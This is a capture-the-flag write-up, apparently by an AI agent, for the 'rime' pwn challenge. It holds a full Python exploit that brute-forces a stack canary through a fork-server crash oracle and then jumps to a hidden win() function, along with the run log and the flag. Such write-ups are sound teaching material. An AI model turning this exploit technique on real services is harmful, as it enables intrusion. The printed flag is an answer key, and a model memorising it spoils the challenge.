---
title: "rime"
ctf: "CryoVault Finals"
date: 2026-10-25
category: pwn
difficulty: hard
points: 472
flag_format: "isfcr{...}"
author: "solve-challenge subagent"
---

# rime

## Summary

Black-box remote pwn service. A pressure-gauge loop reads up to `0x400` bytes
into a 100-byte stack buffer and prints the number of bytes read. A hidden,
forked, **non-PIE** binary with a stack canary protects the return address. The
canary is recovered byte-by-byte using the server's forking behaviour as an
equality oracle, then the return address is redirected to a hidden `win()`
routine at the fixed address `0x4005a0`, which prints the flag.

## Solution

### Step 1: Fingerprint the protocol and the overflow

The service banner is:

```
rime gauge up. send readings.
reading> 
```

Every raw chunk sent (no newline required) produces exactly
`pressure <n> recorded.` where `n == len(chunk)`, then a new prompt. The read
size is `0x400` (sending 2000 bytes yields `pressure 1024` for the first chunk).

The crash boundary reveals the stack layout: 104 bytes are safe, byte 105 must
be `0x00` (a glibc canary LSB), bytes 106+ must match a random canary, and
offset 120 is the saved return address:

| offset | contents |
|--------|----------|
| 0..99 | `char buf[100]` |
| 100..103 | padding |
| 104..111 | stack canary (LSB `0x00`) |
| 112..119 | saved rbx (popped on return, harmless) |
| 120..127 | return address |

A wrong canary byte aborts via `__stack_chk_fail` **before** the pressure line
is printed, while a correct one lets the loop continue and answer `reading> `.
Because the server forks per connection, the canary and ASLR state stay fixed
across crashes (verified with 30 deliberate crashes), so this gives a clean
byte-wise oracle. The original return address was recovered the same way as
`0x4006e5`, proving the binary is non-PIE (fixed base `0x400000`).

### Step 2: Blind ret2win

With the canary known, the return address is fully controllable. A blind scan
of the fixed code range `0x400000..0x401000` (16-byte steps) with a
canary-preserving 128-byte payload found a flag-printing routine at
`0x4005a0` (and mid-function at `0x4005b0`).

Exploit payload:

```
"A" * 104 + canary(8) + "P" * 8 + p64(0x4005a0)
```

### Complete solve script

```python
#!/usr/bin/env python3
"""
rime - CryoVault Finals (Pwn, 472 pts)
=======================================
Black-box remote exploit.

Service protocol:
    banner: "rime gauge up. send readings.\nreading> "
    Each iteration does read(0, buf, 0x400) into a 100-byte stack buffer and
    prints "pressure <n> recorded." where n is the number of bytes read.

Vulnerability: unbounded read into a small stack buffer. The frame layout
(recovered empirically) is:

    offset   0 ..  99  : char buf[100]
    offset 100 .. 103  : padding
    offset 104 .. 111  : stack canary (LSB == 0x00)
    offset 112 .. 119  : saved rbx (popped, harmless)
    offset 120 .. 127  : return address

The server is a fork server (PIE-disabled binary at 0x400000, ASLR frozen in
the parent), so the canary can be brute-forced byte-by-byte: a wrong canary
byte makes __stack_chk_fail abort before the "pressure" line is printed, a
correct one lets the loop continue and answer the prompt.

Once the canary is known, the return address is overwritten with the fixed
address of a hidden win() routine at 0x4005a0 that prints the flag.
"""

import queue
import random
import re
import socket
import struct
import sys
import threading
import time

HOST = "0.cloud.chals.io"
PORT = 24359

PROMPT = b"reading> "
CANARY_LEN = 8
CANARY_OFFSET = 104      # first canary byte (LSB, always 0x00)
RET_OFFSET = 120         # return address slot
WIN_ADDR = 0x4005A0      # hidden flag-printing function (non-PIE, fixed)

WORKERS = 16
BANNER_TIMEOUT = 3.0
RESP_TIMEOUT = 1.2
CONNECT_RETRIES = 6

FLAG_RE = re.compile(rb"isfcr\{[^}]+\}")


# --------------------------------------------------------------------------
# low level socket helpers
# --------------------------------------------------------------------------
def recv_until(sock, token=PROMPT, timeout=RESP_TIMEOUT):
    sock.settimeout(timeout)
    out = b""
    end = time.time() + timeout
    while token not in out and time.time() < end:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            break
        except OSError:
            break
    return out


def recv_for(sock, timeout=1.5):
    sock.settimeout(0.25)
    out = b""
    end = time.time() + timeout
    while time.time() < end:
        try:
            chunk = sock.recv(8192)
            if not chunk:
                break
            out += chunk
        except socket.timeout:
            continue
        except OSError:
            break
    return out


def connect():
    last = None
    for attempt in range(CONNECT_RETRIES):
        try:
            sock = socket.create_connection((HOST, PORT), timeout=6)
            banner = recv_until(sock, timeout=BANNER_TIMEOUT)
            if PROMPT in banner:
                return sock
            last = banner
            sock.close()
        except OSError as exc:
            last = exc
        time.sleep(0.3 * (attempt + 1))
    raise ConnectionError(f"could not reach {HOST}:{PORT}: {last!r}")


def probe(payload, resp_timeout=RESP_TIMEOUT):
    """Send one payload on a fresh connection and return the raw reply."""
    sock = connect()
    try:
        sock.sendall(payload)
        return recv_until(sock, timeout=resp_timeout)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def survived(payload, resp_timeout=RESP_TIMEOUT):
    """True iff the canary check passed and the program printed its pressure."""
    want = b"pressure %d recorded." % len(payload)
    try:
        reply = probe(payload, resp_timeout)
    except ConnectionError:
        return None
    return want in reply and PROMPT in reply


# --------------------------------------------------------------------------
# canary recovery (fork server => byte-wise equality oracle)
# --------------------------------------------------------------------------
def try_byte(prefix, guess, retries=2):
    payload = b"A" * CANARY_OFFSET + bytes(prefix) + bytes([guess])
    for _ in range(retries):
        ok = survived(payload)
        if ok is None:          # connect problem - retry
            time.sleep(0.15)
            continue
        return ok
    return False


def brute_byte(prefix, workers=WORKERS):
    """Find the next canary byte. Returns (byte, None) or (None, reason)."""
    idx = len(prefix)
    order = list(range(256))
    random.Random(0xC0FFEE + idx).shuffle(order)
    work = queue.Queue()
    for guess in order:
        work.put(guess)

    stop = threading.Event()
    found = [None]
    lock = threading.Lock()

    def worker():
        while not stop.is_set():
            try:
                guess = work.get_nowait()
            except queue.Empty:
                return
            ok = try_byte(prefix, guess)
            if ok:
                with lock:
                    if found[0] is None:
                        found[0] = guess
                        stop.set()

    threads = [threading.Thread(target=worker, daemon=True)
               for _ in range(workers)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    return found[0]


def recover_canary(attempts=4):
    """Recover the full 8-byte stack canary, tolerating service restarts."""
    for attempt in range(1, attempts + 1):
        print(f"[*] canary recovery attempt {attempt}/{attempts}", flush=True)
        canary = [0x00]                    # LSB of glibc canary is always 0
        restart = False
        while len(canary) < CANARY_LEN:
            idx = len(canary)
            guess = brute_byte(canary)
            if guess is None:
                print(f"[-] no candidate for canary byte {idx}, restarting",
                      flush=True)
                restart = True
                break
            canary.append(guess)
            print(f"[+] canary byte {idx}: 0x{guess:02x}  "
                  f"({bytes(canary).hex()})", flush=True)
            # verify the prefix on a fresh connection (detects a restart)
            prefix = bytes(canary[:idx + 1])
            payload = b"A" * CANARY_OFFSET + prefix
            if survived(payload) is not True:
                print("[-] prefix verification failed (server restarted?), "
                      "restarting", flush=True)
                restart = True
                break
        if not restart and len(canary) == CANARY_LEN:
            full = bytes(canary)
            if survived(b"A" * CANARY_OFFSET + full) is True:
                return full
            print("[-] full canary verification failed, restarting", flush=True)
    return None


# --------------------------------------------------------------------------
# exploit
# --------------------------------------------------------------------------
def exploit(canary):
    payload = (b"A" * CANARY_OFFSET + canary + b"P" * 8 +
               struct.pack("<Q", WIN_ADDR))
    assert len(payload) == RET_OFFSET + 8
    sock = connect()
    try:
        sock.sendall(payload)
        reply = recv_for(sock, timeout=2.0)
    finally:
        try:
            sock.close()
        except OSError:
            pass
    match = FLAG_RE.search(reply)
    return match.group(0).decode() if match else None


def main():
    print(f"[*] target {HOST}:{PORT}")
    for overall in range(1, 6):
        canary = recover_canary()
        if canary is None:
            print("[-] could not recover canary, retrying")
            continue
        print(f"[+] canary = {canary.hex()}")
        print(f"[*] jumping to win() at {WIN_ADDR:#x}")
        flag = exploit(canary)
        if flag:
            print(f"[+] FLAG: {flag}")
            return 0
        print("[-] exploit attempt failed (restart?), retrying")
    print("[-] failed to retrieve flag")
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

## Flag

```
isfcr{l3ngth_pr3f1x_d0esnt_s4v3_y0u_bl1nd_4c8f21}
```

## Validation

`solve.py` was run end-to-end against `0.cloud.chals.io:24359`; the canary was
recovered live (including one automatic restart retry) and the win jump
printed the flag:

```
[*] target 0.cloud.chals.io:24359
[*] canary recovery attempt 1/4
[+] canary byte 1: 0x00  (0000)
[+] canary byte 2: 0xa5  (0000a5)
[-] prefix verification failed (server restarted?), restarting
[*] canary recovery attempt 2/4
[+] canary byte 1: 0x00  (0000)
[+] canary byte 2: 0xa5  (0000a5)
[+] canary byte 3: 0x99  (0000a599)
[+] canary byte 4: 0x76  (0000a59976)
[+] canary byte 5: 0x1d  (0000a599761d)
[+] canary byte 6: 0x40  (0000a599761d40)
[+] canary byte 7: 0xbc  (0000a599761d40bc)
[+] canary = 0000a599761d40bc
[*] jumping to win() at 0x4005a0
[+] FLAG: isfcr{l3ngth_pr3f1x_d0esnt_s4v3_y0u_bl1nd_4c8f21}
```

An independent fresh-connection check with the known canary also confirms both
`0x4005a0` and `0x4005b0` land in the flag-printing routine:

```
0x4005a0: b'isfcr{l3ngth_pr3f1x_d0esnt_s4v3_y0u_bl1nd_4c8f21}<<EOF>>'
0x4005b0: b'isfcr{l3ngth_pr3f1x_d0esnt_s4v3_y0u_bl1nd_4c8f21}<<EOF>>'
0x400590: b'<<EOF>>'
```
